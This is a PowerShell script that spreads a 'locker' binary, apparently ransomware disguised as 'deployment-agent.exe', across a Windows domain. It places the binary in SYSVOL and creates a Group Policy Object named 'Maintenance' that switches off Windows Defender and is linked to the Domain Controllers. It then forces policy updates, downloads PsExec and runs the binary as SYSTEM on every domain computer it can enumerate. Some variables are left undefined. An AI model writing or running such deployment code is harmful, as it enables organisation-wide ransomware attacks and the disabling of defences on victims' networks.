try { Import-Module ServerManager -ErrorAction Stop } catch {}
try { Add-WindowsFeature RSAT-AD-PowerShell -ErrorAction SilentlyContinue } catch {}
try { Install-WindowsFeature RSAT-AD-PowerShell -ErrorAction SilentlyContinue } catch {}
Import-Module ActiveDirectory -ErrorAction SilentlyContinue
Import-Module GroupPolicy -ErrorAction SilentlyContinue

Write-Host "[+] Getting domain info..."
try {
    $Domain = (Get-ADDomain).DNSRoot
    $DomainDN = (Get-ADDomain).DistinguishedName
    Write-Host "[+] Domain from AD: $Domain"
} catch {
    try {
        $Domain = (Get-WmiObject Win32_ComputerSystem).Domain
        $DomainDN = "DC=" + ($Domain -replace '\.',',DC=')
        Write-Host "[+] Domain from WMI: $Domain"
    } catch {
        $Domain = $env:USERDNSDOMAIN
        $DomainDN = "DC=" + ($Domain -replace '\.',',DC=')
        Write-Host "[+] Domain from env: $Domain"
    }
}

Write-Host "[+] Copying locker to SYSVOL scripts..."
$SysvolScripts = "\\$Domain\SYSVOL\$Domain\scripts"
Copy-Item -Path "C:\Windows\Temp\deployment-agent.exe" -Destination "$SysvolScripts\deployment-agent.exe" -Force
$GpoName = "Maintenance"
New-GPO -Name $GpoName -ErrorAction SilentlyContinue | Out-Null
$GpoScheduledPath = "\\$Domain\SYSVOL\$Domain\Policies\{$guid}\Machine\Preferences\ScheduledTasks"

Remove-GPPrefRegistryValue -Name $GpoName -Context Computer -Key "HKLM\Software\GPOVersionUpdate" -ValueName "Trigger" -ErrorAction SilentlyContinue | Out-Null
Set-GPRegistryValue -Name $GpoName -Key "HKLM\Software\Policies\Microsoft\Windows Defender" -ValueName "DisableAntiSpyware" -Type DWord -Value 1 -ErrorAction SilentlyContinue | Out-Null
New-GPLink -Name $GpoName -Target "OU=Domain Controllers,$DomainDN" -ErrorAction SilentlyContinue | Out-Null

$TaskXml = '<TaskV2 name="Draft">'
$computers = try { Import-Module ActiveDirectory -ErrorAction Stop; Get-ADComputer -Filter * | Select-Object -ExpandProperty Name } catch {}
foreach ($comp in $computers) {
    Invoke-GPUpdate -Computer $comp -RandomDelayInMinutes 0 -Force -ErrorAction SilentlyContinue
    Invoke-Command -ComputerName $comp -ScriptBlock { gpupdate /force } -ErrorAction SilentlyContinue
}

Invoke-WebRequest -Uri $PsExecUri -OutFile 'C:\Temp\psexec.exe'
foreach ($comp in $computers) {
    Copy-Item -Path "C:\Windows\Temp\deployment-agent.exe" -Destination "\\$comp\C$\Windows\Temp\deployment-agent.exe" -Force -ErrorAction SilentlyContinue
    & 'C:\Temp\psexec.exe' -accepteula -d -s "\\$comp" "C:\Windows\Temp\deployment-agent.exe" --password OtherSecret --system
}
